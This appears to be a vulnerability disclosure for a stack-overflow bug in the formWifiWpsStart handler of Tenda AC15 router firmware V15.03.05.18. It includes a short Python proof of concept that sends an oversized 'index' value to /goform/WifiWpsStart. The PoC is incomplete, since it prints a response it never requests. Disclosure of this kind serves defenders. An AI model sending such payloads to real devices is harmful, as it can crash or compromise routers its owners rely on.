## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2710.html

## Affected version

AC15 V15.03.05.18

## Vulnerability details

The Tenda AC15 V15.03.05.18 firmware has a stack overflow vulnerability in the `formWifiWpsStart` function. The `nptr` variable receives the `index` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `index` can trigger this security vulnerability.

![image-20240314181333792](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314181333792.png)

![image-20240314222832798](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314222832798.png)

![image-20240314181310033](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314181310033.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WifiWpsStart"
payload = b"a"*2000

data = {"index": payload}
print(response.text)
```

![image-20240314223131255](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314223131255.png)